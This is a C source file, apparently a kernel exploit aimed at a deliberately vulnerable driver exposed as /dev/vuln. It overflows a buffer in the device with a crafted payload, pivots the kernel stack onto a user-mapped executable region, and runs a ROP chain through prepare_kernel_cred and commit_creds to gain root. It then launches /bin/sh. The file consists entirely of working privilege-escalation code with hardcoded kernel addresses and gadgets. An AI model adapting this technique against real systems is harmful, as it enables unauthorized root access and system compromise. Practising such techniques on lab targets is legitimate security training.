#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

#define _GNU_SOURCE

uint64_t vfs_write_address = 0xffffffff811f5510ULL;
uint64_t ret_stackpivot = 0xffffffff81784532; // mov esp, 0x83000000 ; ret
uint64_t prepare_kernel_cred = 0xffffffff810918e0ULL;
uint64_t commit_creds = 0xffffffff81091630ULL;
uint64_t pop_rdi = 0xffffffff81300f2dULL; // pop rdi; ret;
uint64_t pop_rsp = 0xffffffff81029210ULL; // pop rsp ; ret

int opend_;
void open_device_state() {
  opend_ = open("/dev/vuln", O_RDWR);
  if (opend_ < 0) {
    printf("[-] unable to open device\n");
  } else {
    printf("[+] device opened\n");
  }
}

void smash() {
  uint64_t payload[5];
  payload[0] = 0x4141414141414141ULL;
  payload[1] = 0x4241414141414141ULL;
  payload[2] = 0x4341414141414141ULL;
  payload[3] = 0x4441414141414141ULL;
  payload[4] = (uint64_t)ret_stackpivot;
  write(opend_, payload, sizeof(payload));
}

void stack_pivot() {
  uint64_t *fake_stack;
  fake_stack = mmap((void *)0x83000000 - 0x1000, 0x10000,
                    PROT_READ | PROT_WRITE | PROT_EXEC,
                    MAP_ANONYMOUS | MAP_PRIVATE | MAP_FIXED, -1, 0);
  unsigned off = 0x1000 / 8;
  fake_stack[0] = 0x0deadfULL;
  fake_stack[off++] = pop_rdi; // pop rdi; ret;
  fake_stack[off++] = 0x0;
  fake_stack[off++] = prepare_kernel_cred;
  fake_stack[off++] = commit_creds;
  fake_stack[off++] = pop_rsp;               // pop rsp; ret;
  fake_stack[off++] = 0xffffc900001bff08ULL; // RSP
}

int main() {
  open_device_state();
  stack_pivot();
  smash();
  setreuid(0, 0);
  if (getuid() == 0) {
    printf("[+] the flow is defeated!\n");
    char *argvsh[] = {"/bin/sh", NULL};
    execve("/bin/sh", argvsh, 0);
  } else {
    printf("[?] something went wrong\n");
  }
}
